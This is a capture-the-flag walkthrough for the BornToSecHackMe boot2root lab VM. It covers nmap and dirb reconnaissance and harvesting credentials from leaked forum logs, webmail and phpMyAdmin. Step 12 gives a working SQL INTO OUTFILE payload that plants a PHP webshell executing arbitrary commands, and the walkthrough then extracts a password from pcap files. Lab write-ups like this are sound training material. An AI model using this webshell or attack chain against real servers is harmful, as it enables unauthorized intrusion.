For this recipe, it will be necessary to download nmap and dirb utilities.

nmap is a network tool usefull to scan an IP and find a lot of data about running services etc.

dirb is a web content scanner used to find any hidden or existing web files and directories.

1) Find your IP:

ip a

2) You will find your IP with the CIDR range. Usually /24
scan your IP with nmap and display the list of running services:

nmap -sL <your_IP>

in the list you will find the boot2root server with the corresponding IP:

In my case:
"Nmap scan report for borntosechackme.home (192.168.1.29)"

3) scan the boot2root server with nmap. I chose to use -A flag. it stand for agressive scan. This way, a lot of informations will be displayed.
Interesting informations like expired ssl certification will be displayed, the services versions etc.

nmap -A Nmap <BOOT2ROOT_IP>

4) Here you can see a list of open port with the corresponding versions.
- Appache
- openssh
- vsftpd
etc

5) Before searching for known vulnerabilities for theses versions, lets use dirb on our bornToSecHackMe IP

dirb https://192.168.1.29/

Here, you will see some interesting pages:
<IP>/forum
<IP>/forum/js
<IP>/forum/templates_c
<IP>/phpmyadmin
<IP>/webmail

Each page have some interesting things to look. But before any code, we will read the content of the forum.

6) Type on the nav bar: https://<BOOT2ROOT_IP>/forum
 
The forum is a good place to try the "social engineering" method.
The obvious thread is: "problem login?"
Here, we can see sshd logs of connexion attempts.
There is a lot of hints and usefull information:

| Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
| Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
| Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

The first line is a mistake: the password was entered instead of the username. 
Then we can see the user who made the mistake, line 3 : lmezard

7) Unfortunately, this pair user/password won't let us connect on the BornToSec server.
However, we can connect on the website.

8) Here, we can find lmezard's email by clicking on the user name after log in.

9) With this email and the previous password, we can log to the webmail on the page https://<BOOT2ROOT_IP>/webmail

10) There is a mail with the object "DB ACCESS". There is a password for root user.
But it is not the ssh credentials yet. It is a way to access the web DB.

11) On https://<BOOT2ROOT_IP>/phpmyadmin, use root as ID and the password given in the mail.

12) We are root on the DB. Phpmyadmin is a GUI to handle table database and to make SQL queries.
We will try to create a new php page through SQL with the intent to create a webshell.

let's try the SQL request given in this article : https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/

SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET[\'cmd\']) {​​system($_GET[\"cmd\"]);}​​ ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'

13) Thanks to the webshell we can check the files in there:
If we do "whoami" we see that we are www-data user.
We try ls -la /

We can see the various directories. /home directory is the one under www-data:

ls -la /home

There is a directory LOOKATME. It is the only one with content. 
there is a file named password. 
We get another password for lmezard but still not the root password for bornToSecHackMe.

14) It happens to be credentials for ftp. We can see its open port
type ftp <IP_VM>

14) We see a README and a fun files with ls.

The README says to resolve the challenge to have ths ssh password for the user Laurie.

The file fun have lot of data with .pcap result and //file numbers

Among lot of useless data we can see C function with getme functions from 1 to 12

grep is not possible in ftp server so we download the fun file localy with get command:
get fun

We can now use regular bash commands. When we try to grep, we have a message telling us that it is a binary file.
We grep with the -a option and can retrieve some interesting information.

With different combination of grep, we can see that a series of twelve getme lead us to the password.
It says to perform sha256sum on it afterward.

	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");

By doing:
file fun

We see that it is a tar archive.

tar -xvf fun

We get the directory ft_fun with a lot of .pcap files.

15) All the usefull characters are visibles thanks to the "return" statement.
The only problem is that the getme and the corresponding return are not always complete and sometimes are mixed and splited in differents pcap files.

We write a Bash script (test_fun.bash) to retrieve the relevant pieces of data:
a) First, we get the usefull .pcap files
b) Then we retrieve the file number and use it on the files name.
c) We sort the files
d) We get the return in the right order and display it.
e) We use sha256sum like suggested in the printf.
